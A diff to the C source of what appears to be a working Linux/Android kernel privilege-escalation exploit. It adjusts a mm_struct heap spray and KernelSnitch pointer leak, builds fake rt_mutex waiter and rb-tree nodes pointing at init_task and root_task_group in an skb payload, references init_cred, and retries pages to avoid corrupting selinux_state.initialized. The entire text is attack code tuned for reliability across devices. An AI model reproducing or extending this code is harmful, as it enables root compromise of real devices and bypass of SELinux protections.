@@ -19,6 +19,13 @@ static long long ms_since(struct timespec *t0) {
          (now.tv_nsec - t0->tv_nsec) / 1000000LL;
 }
 
+/* f2fs rollback drops everything since the last checkpoint, so fsync at
+ * stage boundaries or a panicking run loses its own lines */
+void log_sync(void) {
+  fflush(stdout);
+  fsync(STDOUT_FILENO);
+}
+
 uintptr_t page_base;
 uintptr_t last_mm_struct;
 uintptr_t fake_lock;
@@ -55,7 +62,7 @@ int tcp_route_selected(void) {
 void setup_kernelsnitch(void) {
   int cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);
   ks = kernelsnitch_setup(
-      mm_struct_sz(), MM_ORDER, cpu_count, KSNITCH_COLLISIONS, 0, 0);
+      mm_struct_sz(), MM_ORDER, cpu_count, KSNITCH_COLLISIONS, 0);
 }
 
 int kernelsnitch_collisions_ready(void) {
@@ -131,8 +138,13 @@ void log_startup_context(void) {
                "Seccomp_filters=%s", values[0], values[1], values[2]);
     }
   }
-  pr_success("startup context pid=%d uid=%u euid=%u gid=%u egid=%u attr=%s enforce=%s\n",
-             getpid(), getuid(), geteuid(), getgid(), getegid(), attr,
+  struct timespec boot;
+  clock_gettime(CLOCK_BOOTTIME, &boot);
+  double boot_ms = boot.tv_sec * 1000.0 + boot.tv_nsec / 1e6;
+  /* same clock as printk's [timestamp], so a native log line maps onto dmesg */
+  pr_success("startup context pid=%d uid=%u euid=%u gid=%u egid=%u boot_ms=%.0f "
+             "attr=%s enforce=%s\n",
+             getpid(), getuid(), geteuid(), getgid(), getegid(), boot_ms, attr,
              enforce);
   pr_success("startup limits pid=%d %s\n", getpid(), limits);
   pr_success("build config pid=%d label=%s slide=pselect main=pselect\n",
@@ -169,13 +181,15 @@ long sched_setattr_tid(int tid, int nice_value) {
   errno = 0;
   long ret = syscall(274, tid, &attr, 0);
   if (ret != 0) {
-    pr_error("sched_setattr(%d,BATCH,nice=%d) ret=%ld errno=%d\n", tid, nice_value, ret, errno);
+    pr_warning("sched_setattr(%d,BATCH,nice=%d) ret=%ld errno=%d\n", tid, nice_value, ret, errno);
   }
   return ret;
 }
 
 /* Bootloader-selected physical load address. */
 uint64_t p0_kernel_phys_load = P0_KERNEL_PHYS_LOAD;
+
+uint64_t g_direct_map_end = DIRECT_MAP_END;
 
 /* Selected entry's init_cred image address. */
 uintptr_t g_init_cred_image;
@@ -357,9 +371,12 @@ int prepare_skb_payload(uintptr_t base) {
   uintptr_t write_pc = fake_parent;
   uintptr_t write_right = fake_right;
   uintptr_t write_left = fake_left;
-  uint64_t waiter_task = INIT_TASK;
-  uint64_t task_group = ROOT_TASK_GROUP;
-  uint64_t pi_top_task = INIT_TASK;
+  /* Direct-map aliases (data_addr) resolve to the same physical pages and 
+   * are dereferenceable on every SoC — the tcp route already uses SLIDE_INIT_TASK 
+   * the same way for the on-stack waiter. */
+  uint64_t waiter_task = SLIDE_INIT_TASK;
+  uint64_t task_group = SLIDE_ROOT_TASK_GROUP;
+  uint64_t pi_top_task = SLIDE_INIT_TASK;
 
   int compact = active_offsets && active_offsets->compact_waiter;
 
@@ -381,7 +398,7 @@ int prepare_skb_payload(uintptr_t base) {
       put64(p, W0_OFF + 0x00, 1);           /* tree_entry.rb_parent_color */
       put64(p, W0_OFF + 0x08, 0);           /* tree_entry.rb_right */
       put64(p, W0_OFF + 0x10, 0);           /* tree_entry.rb_left */
-      if (tcp && write_right) {
+      if (write_right) {
         put64(p, W0_OFF + 0x18, write_right);
         put64(p, W0_OFF + 0x20, 0);
         put64(p, W0_OFF + 0x28, pselect_custom_target);
@@ -478,7 +495,7 @@ uintptr_t prepare_kernel_page(void) {
 
   int cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);
   ks = kernelsnitch_setup(
-      mm_struct_sz(), MM_ORDER, cpu_count, KSNITCH_COLLISIONS, 0, 0);
+      mm_struct_sz(), MM_ORDER, cpu_count, KSNITCH_COLLISIONS, 0);
   pr_info("[spray] mm spray + kernelsnitch ready (cpu=%d) +%lldms\n",
           cpu_count, ms_since(&t_spray));
 
@@ -568,8 +585,13 @@ uintptr_t prepare_kernel_page(void) {
   pr_info("[spray] mm_struct leaked=0x%zx +%lldms\n",
           (size_t)ks->mm_struct, ms_since(&t_spray));
   uintptr_t leaked = ks->mm_struct;
+  /* the tag nibble replaces bits 56-59; 0xf restores the canonical VA */
+  leaked |= (uintptr_t)0xf << 56;
   last_mm_struct = leaked;
-  if (leaked == (uintptr_t)-1) {
+  /* mm_structs live in the direct map */
+  if (leaked == (uintptr_t)-1 ||
+      leaked < KERNELSNITCH_IDENTITY_START ||
+      leaked >= g_direct_map_end) {
     pr_warning("KernelSnitch mm_struct leak failed\n");
     kernelsnitch_cleanup(ks);
     ks = NULL;
@@ -660,7 +682,7 @@ uintptr_t prepare_kernel_page(void) {
 }
 
 uintptr_t prepare_good_kernel_page(void) {
-  int max_attempts = 4;
+  int max_attempts = 12;
   struct timespec t_good;
   clock_gettime(CLOCK_MONOTONIC, &t_good);
   struct timespec deadline = t_good;
@@ -668,9 +690,17 @@ uintptr_t prepare_good_kernel_page(void) {
   for (int attempt = 1; attempt <= max_attempts; attempt++) {
     uintptr_t base = prepare_kernel_page();
     if (base) {
-      pr_info("prepare_kernel_page ok attempt=%d +%lldms\n", attempt,
-              ms_since(&t_good));
-      return base;
+      /* W1 stores this page address, so the word's byte 2 lands on
+       * selinux_state.initialized. an even byte there fails every SID lookup */
+      if (pselect_custom_write == 1 && pselect_child_node &&
+          ((fake_right >> 16) & 1) == 0) {
+        pr_warning("page %016zx stores an even byte over "
+                   "selinux_state.initialized; taking another\n", (size_t)base);
+      } else {
+        pr_info("prepare_kernel_page ok attempt=%d +%lldms\n", attempt,
+                ms_since(&t_good));
+        return base;
+      }
     }
     struct timespec now;
     clock_gettime(CLOCK_MONOTONIC, &now);
